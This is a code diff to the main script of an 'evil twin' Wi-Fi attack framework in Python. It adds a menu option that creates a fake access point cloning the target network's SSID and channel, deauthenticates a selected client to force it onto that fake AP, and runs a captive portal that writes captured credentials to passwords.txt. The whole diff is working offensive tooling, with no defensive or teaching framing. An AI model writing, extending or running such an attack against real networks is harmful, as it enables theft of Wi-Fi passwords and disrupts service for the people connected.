@@ -7,6 +7,7 @@ import threading
 import evil_twin_framework.network as network
 import evil_twin_framework.data as data
 import evil_twin_framework.dauth as dauth
+import evil_twin_framework.bash_captive as captive
 
 ONE_MINUTE_SCAN = 60
 
@@ -74,9 +75,45 @@ def main():
                             if client_mac:
                                 data.display_final_selection(info, target_bssid, client_mac, cinfo)
                                 
-                                # Here you can add deauth attack option
-                                attack_choice = input("\nDo you want to perform deauth attack? (y/n): ").strip().lower()
-                                if attack_choice == 'y':
+                                # Ask for attack type
+                                attack_choice = input("\nPerform: 'd' for deauth only, 'e' for Evil Twin (deauth+portal), 'n' for none: ").strip().lower()
+                                
+                                if attack_choice == 'e':
+                                    # Evil Twin attack flow
+                                    print("\n[*] Preparing Evil Twin attack...")
+                                    
+                                    # Start Evil Twin (creates fake AP first)
+                                    if captive.quick_start(
+                                        iface,
+                                        target_bssid,
+                                        info['SSID'],
+                                        info['Channel'] or 6
+                                    ):
+                                        # Now deauth the client to force reconnection
+                                        duration = 30
+                                        print(f"\n[*] Deauthing client {client_mac} for {duration} seconds...")
+                                        print("[*] Client should reconnect to our fake AP")
+                                        
+                                        dauth.start_attack(client_mac, target_bssid, iface, duration)
+                                        
+                                        # Wait for attack to complete
+                                        while dauth.is_attack_running():
+                                            time.sleep(0.5)
+                                        
+                                        print("\n[✓] Deauth completed!")
+                                        print("[*] Captive portal is active and waiting for credentials...")
+                                        print("[*] Check passwords.txt for captured credentials")
+                                        
+                                        # Keep portal running until user stops it
+                                        input("\nPress Enter to stop Evil Twin and return to scanning...")
+                                        
+                                        # Stop Evil Twin
+                                        captive.stop_evil_twin()
+                                    else:
+                                        print("[ERROR] Failed to setup Evil Twin")
+                                
+                                elif attack_choice == 'd':
+                                    # Regular deauth attack
                                     duration = input("Enter attack duration in seconds (default 30): ").strip()
                                     duration = int(duration) if duration.isdigit() else 30
                                     
@@ -90,12 +127,13 @@ def main():
                                     print("\nAttack completed!")
                                 
                                 # After attack or if user chose 'n'
-                                next_action = input("\nWhat next? 'c' to continue scanning, 'q' to quit: ").strip().lower()
-                                if next_action == 'q':
-                                    network.stop_sniffing()
-                                    if sniff_thread.is_alive():
-                                        sniff_thread.join(timeout=2)
-                                    sys.exit(0)
+                                if attack_choice != 'q':
+                                    next_action = input("\nWhat next? 'c' to continue scanning, 'q' to quit: ").strip().lower()
+                                    if next_action == 'q':
+                                        network.stop_sniffing()
+                                        if sniff_thread.is_alive():
+                                            sniff_thread.join(timeout=2)
+                                        sys.exit(0)
                                 # If 'c' or anything else, continue scanning
             else:
                 print("Invalid choice.")
@@ -104,11 +142,18 @@ def main():
         pass
     finally:
         print("\nExiting...")
+        
+        # Cleanup any running attacks
         if dauth.is_attack_running():
             dauth.stop_attack()
+        
+        if captive.is_running():
+            captive.stop_evil_twin()
+        
         network.stop_sniffing()
         if sniff_thread.is_alive():
             sniff_thread.join(timeout=2)
+        
         print("Cleanup complete.")
 
 if __name__ == '__main__':
